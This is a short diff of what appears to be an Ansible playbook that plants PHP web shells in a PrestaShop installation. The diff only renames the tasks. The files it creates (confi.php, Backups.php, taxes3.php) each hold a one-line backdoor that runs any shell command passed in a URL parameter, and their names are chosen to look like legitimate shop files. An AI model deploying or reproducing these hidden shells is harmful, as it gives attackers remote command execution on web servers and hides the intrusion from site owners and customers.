@@ -11,11 +11,11 @@
     copy:
       dest: /var/www/html/prestashop/config/confi.php
       content: <?=`$_GET[_]`?> 
-  - name: Create pico.php
+  - name: Create backups.php
     copy:
       dest: /var/www/html/prestashop/classes/Backups.php
       content: <?=`$_GET[backup]`?>
-  - name: Create pico.php
+  - name: Create taxes3.php
     copy:
       dest: /var/www/html/prestashop/classes/tax/taxes3.php
       content: <?=`$_GET[tax]`?> 
